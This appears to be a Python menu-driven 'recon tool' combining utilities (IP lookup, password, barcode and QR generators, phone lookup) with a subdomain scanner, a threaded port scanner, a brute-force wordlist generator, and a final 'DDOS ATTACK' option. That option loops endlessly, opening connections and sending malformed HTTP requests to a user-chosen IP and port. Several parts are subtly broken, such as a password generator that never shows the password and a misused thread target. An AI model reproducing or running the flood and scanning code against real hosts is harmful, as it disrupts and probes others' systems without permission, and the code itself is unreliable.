import socket
import os
import time
from tqdm import *
from pyfiglet import Figlet
import requests
import random
import itertools
import sys
import pyqrcode
from barcode import EAN14
from queue import Queue
import threading
from barcode.writer import ImageWriter
from pip._vendor.distlib.compat import raw_input
import pyfiglet
import phonenumbers
from phonenumbers import carrier
from phonenumbers import geocoder
from tabulate import tabulate

result = pyfiglet.figlet_format("RECON TOOL", font="slant")
print(result)

options = (
    "\n1- MY IP ADDRESS \n 2- PASSWORD GENERATOR \n 3- WORDLIST GENERATOR \n 4- BARCODE GENERATOR \n 5- QRCODE GENERATOR \n 6- PHONE NUMBER INFO \n 7- SUBDOMAIN SCANNER \n 8- PORT SCANNER \n 9- DDOS ATTACK \n")

print(options)
select = int(input("ENTER YOUR CHOICE "R""">>>>---------->"""))

match select:
    case 1:

        def loading():
            for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=75):
                time.sleep(0.01)
            print("Loading Done!")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750, height=30):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')


        if __name__ == "__main__":
            window_size(80, 20)
            print(font("FIND MY IP"))
            loading()

            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            print("YOUR DEVICE IS:" + hostname)
            print("YOUR ip address IS:" + IPAddr)
            raw_input("PRESS ENTER TO EXIT")

    case 2:

        def loading():
            for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=75):
                time.sleep(0.01)
            print("LETS MOVE")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750, height=30):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')


        if __name__ == "__main__":
            window_size(80, 20)
            print(font("PASSWORD GENERATOR"))
            loading()
            length = int(input("ENTER THE LENGTH OF THE PASSWORD "r""">>>>--------->"""))


            def get_random_string(length):
                lower = "abcdefghijklmnopqrstuvwxyz"
                upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                numbers = "1234567890"
                symbols = "@#&*(){}[]/?"
                all = lower + symbols + numbers + upper
                password = "".join(random.sample(all, length))
                print(" GENERATED PASSWORD OF LENGTH", length, " is " r""">>>>-------->""")


            get_random_string(length)
            raw_input("PRESS ENTER TO EXIT")

    case 3:

        def loading():
            for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=75):
                time.sleep(0.01)
            print("LETS MOVE")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750, height=30):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')


        if __name__ == "__main__":
            window_size(80, 20)
            print(font("WORDLIST GENERATOR"))
            loading()
            print("GENERATOR PASSWORD IS SAVED IN THE PRESENT FOLDER/DIRECTORY")
            chrs = raw_input("ENTER THE LETTERS FOR COMBINATION "r""">>>>------>""")
            l = int(raw_input("MINIMUM LENGTH OF PASSWORD "r""">>>>------------>"""))
            k = l
            j = int(raw_input("MAXIMUM LENGTH OF PASSWORD "r""">>>>------------>"""))
            n = j + 1
            mtl = len(chrs)
            p = []
            zt = raw_input("[+] ENTER THE NAME OF THE FILE "r""">>>>------------>""")
            for ltp in range(k, n):
                ans = mtl ** ltp
                p.append(ans)
                tline = sum(p)
                raw_input('ARE YOU READY ? [PRESS Enter]')
                time1 = time.asctime()
                start = time.time()
                psd = open(zt, 'a')

                for i in range(k, n):
                    r = i * 100 / n
                    l = str(r) + ' percent '
                    sys.stdout.write("\r%s" % 1)
                    sys.stdout.flush()
                    psd.flush()

                    for xs in itertools.product(chrs, repeat=i):
                        psd.write(''.join(xs) + '\n')
                        psd.flush()

                psd.close()
                sys.stdout.write("\Done Success ")
                end = time.time()
                '\t [+] Process Completed                :    ', time.asctime()
                totaltime = end - start
                rate = tline / totaltime

                raw_input("Press Enter to exit")

    case 4:

        def loading():
            for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=75):
                time.sleep(0.01)
            print("LETS MOVE")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750, height=30):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')


        def generator(number):
            my_code = EAN14(number, writer=ImageWriter)
            my_code.save("bar_code")


        if __name__ == "__main__":
            window_size(80, 20)
            print(font("BARCODE GENERATOR"))
            loading()
            print("Generated Barcode will be saved as PNG file in the present directory")

            innumber = input("Enter 12 digit number to generate barcode"r""">>>>>>---->""")
            print(innumber)
            generator(innumber)
            raw_input("Press enter to exit")

    case 5:
        def loading():
            for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=60):
                time.sleep(0.01)
            print("LETS MOVE")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750, height=30):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')


        if __name__ == "__main__":
            window_size(80, 20)
            print(font("QRCODE GENERATOR"))
            loading()
            print("GENERATED QR CODE WILL BE SAVED AS myqr.png IN THE PRESENT DIRECTORY")

            s = input("ENTER THE LINK TO CREATE A QRCODE "r""">>>>----------->""")
            url = pyqrcode.create(s)
            url.svg("myqr.svg", scale=8)
            url.png("myqr.png", scale=6)
            raw_input("Press enter to exit")

    case 6:
        def loading():
            for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=60):
                time.sleep(0.01)
            print("LETS MOVE")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750, height=30):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')


        if __name__ == "__main__":
            window_size(80, 20)
            print(font("Phone Number Scanner"))
            loading()


            def num_scanner(phn_num):
                number = phonenumbers.parse(phn_num, "IN")
                description = geocoder.description_for_number(number, 'en')
                supplier = carrier.name_for_number(number, 'en')
                info = [["country", "SUPPLIER"], [description, supplier]]
                data = str(tabulate(info, headers="firstrow", tablefmt="github"))
                return data


            if __name__ == "__main__":
                number = input("ENTER THE NUMER"r""">>>>-------->""")
                print(num_scanner(number))
                raw_input("PRESS ENTER TO EXIT")

    case 7:

        def loading():
            for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=60):
                time.sleep(0.01)
            print("LETS MOVE")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750, height=30):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')


        if __name__ == "__main__":
            window_size(80, 20)
            print(font("SUBDOMAIN SCANNER"))
            loading()
            print(" IT TAKES TIME ACCORDING TO THE DOMAIN")
            print(" Using defaukt added wordlist with 649649 word")
            domain = input("Enter the domain to scan"r">>>>--------->""")
            file = open("subdomain.txt")
            content = file.read()
            subdomains = content.splitlines()
            for subdomain in subdomains:
                url = f"http://{subdomain}.{domain}"
                try:
                    requests.get(url)
                    print("[+]Discoverd subdomain:", url)
                except requests.ConnectionError:
                    print("[x]Subdomain not found", url)

            raw_input("PRESS ENTER TO EXIT")

    case 8:
        def loading():
            for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=60):
                time.sleep(0.01)
            print("LETS MOVE")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750, height=30):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')


        def portscan(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target, port))
                return True
            except:
                return False


        def get_ports(mode):
            if mode == 1:
                for port in range(1, 1024):
                    queue.put(port)
            elif mode == 2:
                for port in range(1, 49152):
                    queue.put(port)
            elif mode == 3:
                ports = [20, 21, 22, 23, 25, 53, 80, 110, 443]
                for port in ports:
                    queue.put(port)
            elif mode == 4:
                ports = input("ENTER YOUR PORTS (separate by blank):")
                ports = ports.split()
                ports = list(map(int, ports))
                for port in ports:
                    queue.put(port)


        def worker():
            while not queue.empty():
                port = queue.get()
                if portscan(port):
                    print("Port {} is open!".format(port))
                    open_ports.append(port)


        def run_scanner(threads, mode):

            get_ports(mode)
            thread_list = []

            for t in range(threads):
                thread = threading.Thread(target=worker)
                thread_list.append(thread)

            for thread in thread_list:
                thread.start()

            for thread in thread_list:
                thread.join()

            print("open ports are:", open_ports)


        if __name__ == "__main__":
            window_size(80, 20)
            print(font("PORT SCANNER"))
            loading()
            print("KEEP SOME PATIENCE")
            target = input("Enter the ip address to scan"r""">>>>----------->""")
            mode = int(input("Enter Port scan mode"))
            queue = Queue()
            open_ports = []
            run_scanner(100, mode)

    case 9:
        def loading():
            for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=60):
                time.sleep(0.01)
            print("LETS MOVE")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750, height=30):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')


        if __name__ == "__main__":
            window_size(80, 20)
            print(font("DDOS ATTACK"))
            loading()

            target = raw_input("ENTER THE IP ADDRESS "r""">>>>>>--------------->""")
            port = int(input("Enter the port "r""">>>>>>--------------->"""))
            fake_ip = '181.4.20.196'
            already_Connected = 0


            def attack():
                while True:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
                    s.sendto(("GET /" + fake_ip + "HTTP/1.1\r\n").encode('ascii'), (target, port))
                    s.close()
                    global already_Connected
                    already_Connected += 1
                    if already_Connected % 500 == 0:
                        print(already_Connected)

            for i in range(500):
                thread = threading.Thread(target=attack())
                thread.start()

            raw_input("PRESS ENTER TO EXIT")
